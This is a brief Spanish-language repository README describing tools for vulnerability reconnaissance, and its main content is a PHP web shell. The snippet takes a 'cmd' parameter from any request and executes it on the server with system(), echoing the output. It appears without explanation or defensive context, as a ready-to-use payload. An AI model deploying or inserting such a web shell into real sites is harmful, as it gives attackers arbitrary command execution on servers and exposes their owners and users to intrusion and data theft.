# Recon-
Mi repositorio sobre herramientas y configuraciones para la fase de reconocimiento de vulnerabilidades.


```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
    die;
}
